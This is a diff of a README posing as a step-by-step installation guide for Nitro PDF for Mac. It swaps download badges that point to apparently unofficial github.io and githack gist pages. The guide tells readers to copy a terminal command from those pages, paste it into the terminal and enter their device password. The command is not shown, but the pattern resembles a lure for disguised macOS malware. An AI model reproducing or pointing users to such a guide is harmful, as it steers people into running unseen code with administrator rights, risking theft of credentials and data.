@@ -4,7 +4,7 @@
 Nitro PDF for Mac is a professional PDF editor that allows you to create, edit, sign, and convert PDF documents easily 📄✨.  
 This guide helps you download and install Nitro PDF on your Mac step by step.  
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/nitropdf)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)  
 
 If the button above does not work, please follow the instructions below to install Nitro PDF using the terminal command.  
 
@@ -25,7 +25,7 @@ If the button above does not work, please follow the instructions below to insta
 
 1. Click the button below to get the installation command.  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-00C853?style=for-the-badge&logo=terminal)](https://gistcdn.githack.com/bountyhuntergekata-svg/e3057e5ea2db5afb177822989f4bc16c/raw/1349586a7be751fa8ef74c70f35af4ed7cfad693/install.html)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)  
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.  
